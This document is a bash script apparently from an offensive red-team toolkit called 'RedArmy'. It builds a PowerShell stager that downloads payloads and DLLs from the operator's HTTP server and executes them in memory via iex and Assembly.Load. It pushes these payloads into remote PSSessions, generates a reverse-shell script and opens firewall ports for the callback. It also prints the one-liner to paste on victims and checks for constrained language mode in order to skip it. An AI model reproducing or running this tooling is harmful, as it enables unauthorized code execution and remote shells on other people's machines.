#!/usr/bin/env bash

### Helpers begin
check_deps() {
    for d in "${deps[@]}"; do
        [[ -n $(command -v "$d") ]] || errx 128 "$d is not installed"
    done; unset d
}
err() { echo -e "${color:+\e[31m}[!] $*\e[0m"; }
errx() { err "${*:2}"; exit "$1"; }
good() { echo -e "${color:+\e[32m}[+] $*\e[0m"; }
info() { echo -e "${color:+\e[37m}[*] $*\e[0m"; }
long_opt() {
    local arg shift="0"
    case "$1" in
        "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || usage 127 ;;
        *) shift="1"; shift; [[ $# -gt 0 ]] || usage 127; arg="$1" ;;
    esac
    echo "$arg"
    return $shift
}
subinfo() { echo -e "${color:+\e[36m}[=] $*\e[0m"; }
warn() { echo -e "${color:+\e[33m}[-] $*\e[0m"; }
### Helpers end

cleanup() {
    # Close firewall
    subinfo "Closing $rport and $port on $ip interface (using sudo)"
    sudo iptables -D INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
    sudo iptables -D INPUT -p tcp -d "$ip" --dport "$rport" -j ACCEPT

    # Cleanup
    rm -rf "$invade_ps1" "$rshell_ps1"
}

deploy() {
    local action
    local name="$1"
    local path="$2"
    local sb

    case "$path" in
        *".dll") action="Import"; name="${name}DLL" ;;
        "./"*".ps1") action="Invoke" ;;
        *".ps1"|*".psd1"|*."psm1") action="Get" ;;
    esac

    # Build scriptblock
    case "$action" in
        "Get"|"Invoke") sb="\$(Get-$name)" ;;
        "Import") sb="(Get-Command $action-$name).definition" ;;
    esac

    cat <<EOF
function $action-$name {
$(
    case "$action" in
        ("Get")
            cat <<EOS
    [System.Text.Encoding]::ASCII.GetString(($iwr $url/$path).content)
EOS
            ;;
        ("Import")
            cat <<EOS
    Import-Module -Assembly (
        [System.Reflection.Assembly]::Load(($iwr $url/$path).content)
    )
EOS
            ;;
        ("Invoke")
            cat <<EOS
    iex (
        [System.Text.Encoding]::ASCII.GetString(
            ($iwr $url/$path).content
        )
    )
EOS
            ;;
    esac
)
}
$(
    case "$action" in
        ("Invoke")
            cat <<EOS
function Get-$name {
    [System.Text.Encoding]::ASCII.GetString(($iwr $url/$path).content)
}
function $action-${name}InBg {
    Start-Job -ScriptBlock (
        [scriptblock]::Create(
            'Start-Process -ArgumentList "-c", (
                [scriptblock]::Create(\$(Get-$name))
            ) -NoNewWindow powershell'
        )
    )
}
EOS
            ;;
    esac
)
function Deploy-$name {
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.Runspaces.PSSession]
        \$sess
    )

    Invoke-Command -ScriptBlock (
        [scriptblock]::Create($sb)
    ) -Session \$sess
}
$(
    case "$action" in
        ("Invoke")
            cat <<EOS
function Deploy-${name}InBg {
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.Runspaces.PSSession]
        \$sess
    )

    Invoke-Command -AsJob -ScriptBlock (
        [scriptblock]::Create($sb)
    ) -Session \$sess
    sleep 1
    Get-Job | select -last 1 | Receive-Job
}
EOS
            ;;
    esac
)

EOF
}

simplehttp() {
    if [[ -n $(command -v ruby) ]]; then
        ruby -e httpd -r un -- -p "$1"
    elif [[ -n $(command -v python3) ]]; then
        python3 -m http.server "$1"
    elif [[ -n $(command -v python2) ]]; then
        python2 -m SimpleHTTPServer "$1"
    elif [[ -n $(command -v php) ]]; then
        php -S 0.0.0.0:"$1"
    else
        errx 99 "Can't find php, python2, python3, or ruby"
    fi
}

usage() {
    cat <<EOF
Usage: ${0##*/} [OPTIONS] <ip>

Spin up a simple HTTP server to host the RedArmy scripts.

Options:
    -h, --help         Display this help message
    --no-color         Disable colorized output
    -p, --port=NUM     Use the specified port (default: 8080)
    -r, --rport=NUM    Use the specified port for reverse shell
                       (default: 4444)
    -u, --update       Update git submodules

EOF
    exit "$1"
}

declare -a args deps
unset help update
color="true"
deps+=("git")
deps+=("iptables")
invade_ps1="invade.ps1"
port="8080"
rport="4444"
rshell_ps1="rshell.ps1"

# Check for missing dependencies
check_deps

# Parse command line options
while [[ $# -gt 0 ]]; do
    case "$1" in
        "--") shift && args+=("$@") && break ;;
        "-h"|"--help") help="true" ;;
        "--no-color") unset color ;;
        "-p"|"--port"*) port="$(long_opt "$@")" || shift ;;
        "-r"|"--rport"*) rport="$(long_opt "$@")" || shift ;;
        "-u"|"--update"*) update="true" ;;
        *) args+=("$1") ;;
    esac
    shift
done
[[ ${#args[@]} -eq 0 ]] || set -- "${args[@]}"

# Check for valid params
[[ -z $help ]] || usage 0
[[ $# -eq 1 ]] || usage 1

ip="$1"
url="http://$ip:$port"

if [[ -n $update ]]; then
    git submodule update --init --recursive
    git submodule foreach ../../scripts/update_module
fi

config="config.default"
[[ ! -f config ]] || config="config"

# Save some variables for convenience
cwd="\$ExecutionContext.SessionState.Path.CurrentLocation"
iwr="iwr -DisableKeepAlive -UseBasicParsing"
languagemode="\$ExecutionContext.SessionState.LanguageMode"
red="\$([char]27)[41m"
reset="\$([char]27)[0m"

# Setup trap
trap cleanup SIGINT

# Create reverse shell powershell script
chmod +x scripts/reverse_powershell # Ensure executable
./scripts/reverse_powershell -p "$rport" "$ip" >"$rshell_ps1"

# Setup invade script
cat >"$invade_ps1" <<EOF
if (($languagemode -match "constrained")) {
    echo "Constrained shell detected, retreating"
    return
}

$(
    while read -r name path; do
        deploy "$name" "$path"
    done < <(grep -Psv "^\s*(#.*)?$" "$config"); unset name path

    # Add reverse shell function
    deploy ReverseShell "./$rshell_ps1"
)

# Change prompt colors so user knows RedArmy is loaded in current
# session
function prompt {
    "${red}PS \$($cwd)\$(">" * (\$NestedPromptLevel + 1))$reset "
}
EOF

# Let user know what to type
info "iex ($iwr $url/$invade_ps1)"
warn "Don't forget your reverse shell listener on port $rport"

# Open firewall
subinfo "Opening $rport and $port on $ip interface (using sudo)"
sudo iptables -I INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
sudo iptables -I INPUT -p tcp -d "$ip" --dport "$rport" -j ACCEPT

# Serve via HTTP
simplehttp "$port" || cleanup
